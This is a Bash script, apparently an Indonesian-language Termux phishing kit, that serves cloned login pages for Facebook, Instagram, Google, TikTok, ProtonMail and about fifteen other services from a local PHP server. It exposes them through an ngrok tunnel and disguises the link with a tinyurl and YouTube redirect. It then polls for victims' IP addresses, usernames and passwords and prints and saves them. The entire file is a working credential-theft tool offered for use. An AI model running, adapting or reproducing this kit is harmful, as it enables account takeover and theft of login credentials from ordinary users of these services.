#!/bin/bash


## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"  KU="$(printf '\e[1;93m\n')"

## Directories
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Dihentikan!" 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Dihentikan!" 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
    return
}

## Kill already running process
kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` ]]; then
		killall ngrok > /dev/null 2>&1
	fi	
}

## Banner
banner() {
	    printf '\n'
        printf '\e[0m\e[1;92m╔═══╗╔═══╗╔═══╗╔══╗╔════╗╔═══╗╔═══╗╔╗─╔╗\n'
        printf '\e[0m\e[1;92m║╔═╗║║╔═╗║╚╗╔╗║╚╗╔╝║╔╗╔╗║║╔══╝║╔═╗║║║─║║\n'
        printf '\e[0m\e[1;92m║║─║║║╚═╝║─║║║║─║║─╚╝║║╚╝║╚══╗║║─╚╝║╚═╝║\n'
        printf '\e[0m\e[1;92m║╚═╝║║╔╗╔╝─║║║║─║║───║║──║╔══╝║║─╔╗║╔═╗║\n'
        printf '\e[0m\e[1;92m║╔═╗║║║║╚╗╔╝╚╝║╔╝╚╗──║║──║╚══╗║╚═╝║║║─║║\n'
        printf '\e[0m\e[1;92m╚╝─╚╝╚╝╚═╝╚═══╝╚══╝──╚╝──╚═══╝╚═══╝╚╝─╚╝ \e[1;93mV1.00\n'
        printf '\e[0m\n'
        printf '\e[0m\e[1;41m Phising Tools Termux 40+ Command!  [BY : ARDIGANS]\e[0m\n'
        printf '\e[0m\n'
}

## Dependencies
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi
    fi

	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
	else
		pkgs=(php curl wget unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ `command -v pkg` ]]; then
					pkg install "$pkg"
				elif [[ `command -v apt` ]]; then
					apt install "$pkg" -y
				elif [[ `command -v apt-get` ]]; then
					apt-get install "$pkg" -y
				elif [[ `command -v pacman` ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ `command -v dnf` ]]; then
					sudo dnf -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi

}

## Download Ngrok
download_ngrok() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		unzip "$file" > /dev/null 2>&1
		mv -f ngrok .server/ngrok > /dev/null 2>&1
		rm -rf "$file" > /dev/null 2>&1
		chmod +x .server/ngrok > /dev/null 2>&1
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Ngrok manually."
		{ reset_color; exit 1; }
	fi
}

## Install ngrok
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok Telah Di Install"
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Menginstall Ngrok..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
		else
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
		fi
	fi

}

## Setup website and start php server
HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e "\n${RED}[${WHITE}+${RED}]${GREEN} Memuat Server Tautan..."${WHITE}
	cp -rf .Websitenya/"$website"/* .server/www
	cp -f .Websitenya/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}+${RED}]${GREEN} Memuat PHP Server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	#echo -e "\n${RED}[${WHITE}+${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
	#echo -ne "\n${RED}[${WHITE}+${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
	printf '\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP Target:\e[0m\e[1;77m %s\e[0m\n' $IP
	cat .server/www/ip.txt >> ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
	IFS=$'\n'
	#echo -e "\n${RED}[${WHITE}+${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
	#echo -e "\n${RED}[${WHITE}+${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
	printf "\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Account:\e[0m\e[1;77m %s\n\e[0m" $ACCOUNT
	printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Password:\e[0m\e[1;77m %s\n\e[0m" $PASSWORD
	cat .server/www/usernames.txt >> usernames.dat
	echo -ne "\n${RED}[${WHITE}+${RED}]\033[32m Menunggu Info Login Selanjutnya..."
}

## Print data
capture_data() {
	echo -ne "\n${RED}[${WHITE}+${RED}]${GREEN} Menunggu Info Login..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			printf "\n\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m]${GREEN} Alamat IP Target Ditemukan!"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			printf "\n\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m]${GREEN} info Login Ditemukan!!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start ngrok
start_ngrok() {
	echo -e "\n${RED}[${WHITE}+${RED}]${GREEN} Memuat Tautan"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}+${RED}]${GREEN} Memuat Ngrok..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
    else
        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
	printf "\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m]\033[32m Link Siap: ${WHITE}$ngrok_url"
	send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$ngrok_url" | head -n1)
    printf '\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m]\033[32m Atau Gunakan Metode tinyurl:\e[0m\e[1;77m %s \n' $send_ip
    printf "\n"
	capture_data
}

## Menu
main_menu() {
	{ clear; banner; }
		printf "      ${RED}[${WHITE}∆${RED}]${KU} Pilih Metode Website/Situs ${RED}[${WHITE}∆${RED}]${ORANGE}\n"
        printf "\n"
	    printf "${RED}[${WHITE}01${RED}]${KU} Facebook Login\n"
		printf "${RED}[${WHITE}02${RED}]${KU} FB Advanced Voting\n"
		printf "${RED}[${WHITE}03${RED}]${KU} Facebook Security\n"
		printf "${RED}[${WHITE}04${RED}]${KU} Facebook Mess Login\n"
		printf "${RED}[${WHITE}05${RED}]${KU} Instagram Web Login\n"
		printf "${RED}[${WHITE}06${RED}]${KU} Instagram Followers\n"
		printf "${RED}[${WHITE}07${RED}]${KU} Instagram 1000 Follow\n"
		printf "${RED}[${WHITE}08${RED}]${KU} Instagram Verifikasi\n"
		printf "${RED}[${WHITE}09${RED}]${KU} Geogle\n"
        printf "${RED}[${WHITE}10${RED}]${KU} Tiktok\n"                
        printf "${RED}[${WHITE}11${RED}]${KU} Twitch\n"
		printf "${RED}[${WHITE}12${RED}]${KU} Pinterest\n"
		printf "${RED}[${WHITE}13${RED}]${KU} Snapchat\n"
		printf "${RED}[${WHITE}14${RED}]${KU} LinkEdin\n"
		printf "${RED}[${WHITE}15${RED}]${KU} Ebay\n"
		printf "${RED}[${WHITE}16${RED}]${KU} Quora\n"
		printf "${RED}[${WHITE}17${RED}]${KU} Protonmail\n"
		printf "${RED}[${WHITE}18${RED}]${KU} Sportify\n"
		printf "${RED}[${WHITE}19${RED}]${KU} Reddit\n"
        printf "${RED}[${WHITE}20${RED}]${KU} Adobe\n"
        printf "\n"
		printf "${RED}[${WHITE}Y${RED}]${KU} Youtube Me     ${RED}[${WHITE}W${RED}]${KU} WhatsApp Me\n"	
	    read -p "${GREEN}[ArdiTech]•> ${ORANGE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="facebook"
		start_ngrok
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="fb_advanced"
		start_ngrok
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="fb_security"
		start_ngrok
	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
		website="fb_messenger"
		start_ngrok
	elif [[ "$REPLY" == 5 || "$REPLY" == 05 ]]; then
		website="instagram"
		start_ngrok
	elif [[ "$REPLY" == 6 || "$REPLY" == 06 ]]; then
		website="ig_followers"
		start_ngrok
	elif [[ "$REPLY" == 7 || "$REPLY" == 07 ]]; then
		website="insta_followers"
		start_ngrok
	elif [[ "$REPLY" == 8 || "$REPLY" == 08 ]]; then
		website="ig_verify"
		start_ngrok
	elif [[ "$REPLY" == 9 || "$REPLY" == 09 ]]; then
		website="google"
		start_ngrok
	elif [[ "$REPLY" == 10 || "$REPLY" == 10 ]]; then
		website="tiktok"
		start_ngrok
	elif [[ "$REPLY" == 11 ]]; then
		website="twitch"
		start_ngrok
	elif [[ "$REPLY" == 12 ]]; then
		website="pinterest"
		start_ngrok
	elif [[ "$REPLY" == 13 ]]; then
		website="snapchat"
		start_ngrok
	elif [[ "$REPLY" == 14 ]]; then
		website="linkedin"
		start_ngrok
	elif [[ "$REPLY" == 15 ]]; then
		website="ebay"
		start_ngrok
	elif [[ "$REPLY" == 16 ]]; then
		website="quora"
		start_ngrok
	elif [[ "$REPLY" == 17 ]]; then
		website="protonmail"
		start_ngrok
	elif [[ "$REPLY" == 18 ]]; then
		website="spotify"
		start_ngrok
	elif [[ "$REPLY" == 19 ]]; then
		website="reddit"
		start_ngrok
	elif [[ "$REPLY" == 20 ]]; then
		website="adobe"
		start_ngrok
	elif [[ "$REPLY" == Y ]]; then
        banner
        am start -a android.intent.action.VIEW https://youtube.com/channel/UCxTE4c-xqpAqayme5ps560A

    elif [[ "$REPLY" == W ]]; then 
        banner
        am start -a android.intent.action.VIEW https://wa.me/6285282996146
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Pilihan Tidak Ditemukan!"
		{ sleep 1; main_menu; }
	fi
}

## Main
kill_pid
dependencies
install_ngrok
main_menu